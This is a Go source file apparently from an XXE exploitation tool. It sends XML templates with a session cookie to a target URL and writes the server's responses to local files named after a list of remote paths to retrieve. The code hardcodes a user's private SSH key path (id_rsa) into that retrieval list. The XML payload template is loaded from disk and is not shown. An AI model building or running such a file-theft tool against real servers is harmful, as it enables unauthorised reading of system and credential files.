package xxe

import (
	"bufio"
	"bytes"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"

	fp "path/filepath"

	str "strings"
)

type ParamsT struct {
	Url        string
	XmlData    string
	XmlDecoder *xml.Decoder
	Cookie     string
	OutDir     string
	FileList   string
	Files      []string
}

type NodeT struct {
	XMLName xml.Name
	Attrs   []xml.Attr `xml:"-"`
	Content []byte     `xml:",innerxml"`
	Nodes   []NodeT    `xml:",any"`
}

type LeafT struct {
	Name  string
	Value string
}

func GetParams(url, xmlTemplate, cookie, outDir, fileList string) (ParamsT, error) {
	var p ParamsT

	p.Url = url

	xmlData, err := ioutil.ReadFile(xmlTemplate)
	if err != nil {
		return p, err
	}
	p.XmlData = string(xmlData)
	p.XmlDecoder = xml.NewDecoder(bytes.NewBuffer(xmlData))

	p.Cookie = cookie
	p.OutDir = outDir
	p.FileList = fileList

	p.Files, err = readFileList(fileList)
	if err != nil {
		return p, err
	}

	// todo: make this more general
	p.Files = append(p.Files, "c:/users/daniel/.ssh/id_rsa")

	return p, nil
}

func walkNodes(nodes []NodeT, f func(NodeT) bool) {
	for _, n := range nodes {
		if f(n) {
			walkNodes(n.Nodes, f)
		}
	}
}

func saveFile(file, content string, isDeflated bool) error {
	opts := os.O_CREATE | os.O_TRUNC | os.O_WRONLY
	fd, err := os.OpenFile(file, opts, 0644)
	if err != nil {
		return err
	}
	defer fd.Close()

	fmt.Fprintf(fd, content)

	return nil
}

func readFileList(path string) ([]string, error) {
	var fileList []string

	fd, err := os.Open(path)
	defer fd.Close()
	if err != nil {
		return fileList, err
	}

	input := bufio.NewScanner(fd)
	for input.Scan() {
		line := str.Trim(input.Text(), " ")
		fileList = append(fileList, line)
	}

	return fileList, nil
}

func makeLocalPath(outDir, path string) string {
	path = fp.Clean(path)
	pFields := str.Split(path, "/")

	errPath := pFields[0] == "." || pFields[0] == ".." || pFields[0] == "/"
	if len(pFields) == 1 && errPath {
		return outDir + "/out_file"
	} else if len(pFields) == 1 {
		return fp.Join(outDir, pFields[0])
	}

	var cleanFields []string
	for _, el := range pFields[1:] {
		if el != ".." {
			cleanFields = append(cleanFields, el)
		}
	}

	path = str.Join(cleanFields, "/")
	path = fp.Join(outDir, path)
	os.MkdirAll(fp.Dir(path), 0750)

	return path
}

func makeRequest(url, reqXml, cookie, outDir string) (string, error) {
	client := &http.Client{}

	req, err := http.NewRequest("POST", url, str.NewReader(reqXml))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("cookie", cookie)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	bodyText, err := ioutil.ReadAll(resp.Body)

	return string(bodyText), nil
}
